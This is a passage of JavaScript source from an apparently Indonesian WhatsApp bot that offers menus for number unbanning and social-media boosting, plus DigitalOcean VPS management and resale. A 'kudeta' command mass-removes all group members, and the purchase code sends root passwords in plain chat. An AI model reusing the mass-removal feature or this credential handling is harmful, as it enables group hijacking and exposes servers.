if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const txt226 = `┏━┳┳┳━┳┳┓
┃━┫┃┃┏┫━┫┏┓
┃┏┫┃┃┗┫┃┃┃┃
┗┛┗━┻━┻┻┛┃┃
┏┳┳━┳┳┳┓┏┫┣┳┓
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻┛┗┛━━┛

┌──『 *MENU UNBANNED* 』
│ ${prefix}unbannedv1 *nomor*
│ ${prefix}unbannedv2 *nomor*
│ ${prefix}unbannedv3 *nomor*
│ ${prefix}unbannedv4 *nomor*
│ ${prefix}unbannedv5 *nomor*
└──────`
reply(txt226)
}
break
        case "otomatismenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *ALL OTOMATIS* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ ${prefix}buysc
⭔ ${prefix}buyakn
⭔ ${prefix}buyvps
⭔ ${prefix}buysrv 
⭔ ${prefix}deposit
⭔ ${prefix}buyprem
⭔ ${prefix}buydomain
⭔ ${prefix}buyowner
⭔ ${prefix}adminpanel
⭔ ${prefix}cekharga
⭔ ${prefix}payment
⭔ ${prefix}donasi
⭔ ${prefix}jasa
⭔ ${prefix}vps

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textoto,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break 
        case "suntikmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *SUNTIK MENU* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ ${prefix}ceksaldo-smm
⭔ ${prefix}smmlist
⭔ ${prefix}suntiksmm _id link jumlah_
⭔ ${prefix}cektransaksi _id order_
⭔ ${prefix}deposit-smm _jumlah depo nya_

*NOTE : MASIH DALAM PERKEMBANGAN!!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textoto,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break 
case "vpsmenu":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
    const cvps = `*Hi @${sender.split("@")[0]} 👋*

╭─━─━─〘 *VPS MENU* 〙─━─━─━
│
│➵ ${prefix}vpsdo
│
╰━─━〘 Powered By *@${owned.split("@")[0]}* 〙━─━

`
Biiofc.sendMessage(m.chat, {
text: cvps,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "vpsdo":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
    const cvps = `*Hi @${sender.split("@")[0]} 👋*

╭─━─━─〘 *VPS DIGITAL OCEAN* 〙─━─━─━
│
│➵ ${prefix}deldroplet
│➵ ${prefix}svps / sendvps
│➵ ${prefix}sdomain / sendomain
│➵ ${prefix}listdroplet
│➵ ${prefix}cekdroplet
│➵ ${prefix}turnoff
│➵ ${prefix}turnon
│➵ ${prefix}sisadroplet
│➵ ${prefix}rebuild
│➵ ${prefix}restartvps
│➵ ${prefix}vps1g1c
│➵ ${prefix}vps2g1c
│➵ ${prefix}vps4g2c
│➵ ${prefix}vps8g4c
│
╰━─━〘 Powered By *@${owned.split("@")[0]}* 〙━─━

`
Biiofc.sendMessage(m.chat, {
text: cvps,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case 'listdaftar':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let xx_us = JSON.parse(fs.readFileSync("./freya/user.json"));
let no = 1
let teks_db =`*INFO-DASHBOARD*

*• Terdaftar :* ( ${("id", db_user).length} )`
for (let x of xx_us){
teks_db +=`*User${no++} ${x.name}*\n*ID: @${x.id.split('@')[0]}*\n*Premium: ${x.premium? 'aktif':'tidak'}*\n\n`
}
reply(teks_db)
}
break
case 'daftar':{
    if (cekUser("id", sender) !== null) return reply('Kamu sudah terdaftar !!')
var res_us = `${makeid(10)}`
var user_name = `#GR${makeid(5)}`
let object_user = {"id": sender, "name": user_name, "seri": res_us, "premium": false }
db_user.push(object_user)
fs.writeFileSync('./freya/user.json', JSON.stringify(db_user, 2, null))
reply(`Sukses, Anda Sekarang Sudah Terdaftar✅ @${sender.split("@")[0]}`, [sender])
var verify_teks =`───「 𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 」────

○ ID : @${sender.split('@')[0]}
○ Name : ${pushname}
○ Seri : ${res_us}

silahkan ketik .menu
bila tidak bisa mohon
maaf, sc nya private🙏
`
Biiofc.sendMessage(from, {text : verify_teks}, {quoted: hw})
}
break
case "test":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Bot Active Tuan😜: ${runtime(process.uptime())}`)
}
break
case "kudeta":{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
let data = participants.map((x) => x.id)
for (let x of data) {
if (x !== botNumber && x !== groupMetadata.owner && x !== ownerNumber + "@s.whatsapp.net") {
Biiofc.groupParticipantsUpdate(m.chat, [x], "remove")
await sleep(1000) 
}}}
break
case "sisadroplet":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
async function getDropletInfo() {
  try {
    const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    if (accountResponse.status === 200 && dropletsResponse.status === 200) {
      const dropletLimit = accountResponse.data.account.droplet_limit;
      const dropletsCount = dropletsResponse.data.droplets.length;
      const remainingDroplets = dropletLimit - dropletsCount;

      return {
        dropletLimit,
        remainingDroplets,
        totalDroplets: dropletsCount,
      };
    } else {
      throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet.');
    }
  } catch (error) {
    throw error;
  }
}

// Definisikan fungsi untuk mengeksekusi kasus "sisadroplet"
async function sisadropletHandler() {
  try {
    if (!isOwner) {
      return m.reply('Lu Siapanya Gua Anjg');
    }

    const dropletInfo = await getDropletInfo();
    m.reply(`*Sisa Droplet Yang Dapat Anda Pakai: ${dropletInfo.remainingDroplets}*

*Total Droplet Yang Sudah Terpakai: ${dropletInfo.totalDroplets}*`);
  } catch (error) {
    m.reply(`Terjadi kesalahan: ${error.message}`);
  }
}

  sisadropletHandler();
  break;
}
case "restartvps": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isOwner) return reply(`Sok Asik Anjg`)
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  // Fungsi untuk melakukan restart VPS berdasarkan ID droplet
  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'reboot'
        })
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Gagal melakukan restart VPS: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan restart VPS:', error.message);
      reply('Terjadi kesalahan saat melakukan restart VPS.');
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err);
    });

  break;
}
case "turnoff": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Droplet):', error.message);
    }
  }

  turnOffDroplet();
  break;
}

        
case "turnon": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dihidupkan...');
      } else {
        reply('Gagal menghidupkan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat menghidupkan VPS (Droplet):', error.message);
    }
  }

  turnOnDroplet();
  break;
}
        
        
case "rebuild": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return m.reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Anjg`);

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild droplet menggunakan API DigitalOcean
      const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'rebuild',
          image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
        })
      });

      if (response.ok) {
        const data = await response.json();
        reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
          await sleep(60000) 
 Biiofc.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.message);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error);
    }
  };

  rebuildVPS();
}
break;

        case "deldroplet": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        m.reply('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      m.reply('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();

  break;
}
 case "listdroplet": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return m.reply("Anda bukan pemilik.");

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + API_TOKEN
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      Biiofc.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }

  break;
}
    
 case "cekdroplet": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return m.reply(`Ngapain? Kepo Amat Dah`);

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  // Mendapatkan informasi droplet (VPS) berdasarkan ID
  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status // Menambahkan status VPS
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat memeriksa detail droplet:', error.message);
      throw new Error('Terjadi kesalahan saat memeriksa detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS ANDA*\nDroplet Id: ${info.dropletid}\nHostname: ${info.username}\nIpv4 : ${info.ip}\nRam : ${info.ram}\nOS : ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus : ${info.status}`;
      Biiofc.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      Biiofc.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });

  break;
}
       
        
    case "buypaketvps1g1c": {
if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 20000, db_saldo)
break

    case "buypaketvps2g1c": {
if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 25000, db_saldo)
break  
 
    case "buypaketvps2g2c": {
if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 30000, db_saldo)
break      
    case "buypaketvps4g2c": {
if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 45000, db_saldo)
break        
     case "buypaketvps8g4c": {
if (cekSaldo(sender,db_saldo) < 55000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp55.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
